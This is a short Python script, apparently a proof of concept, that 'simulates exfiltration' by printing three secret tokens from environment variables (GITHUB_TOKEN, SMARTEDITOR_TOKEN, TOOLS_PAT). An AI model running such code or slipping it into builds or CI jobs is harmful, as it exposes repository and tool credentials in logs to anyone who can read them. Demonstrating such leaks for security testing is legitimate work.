import os

# Simulate exfiltration by printing environment variables (e.g., secrets)
print(f"GITHUB_TOKEN: {os.getenv('GITHUB_TOKEN')}")
print(f"SMARTEDITOR_TOKEN: {os.getenv('SMARTEDITOR_TOKEN')}")
print(f"TOOLS_PAT: {os.getenv('TOOLS_PAT')}")
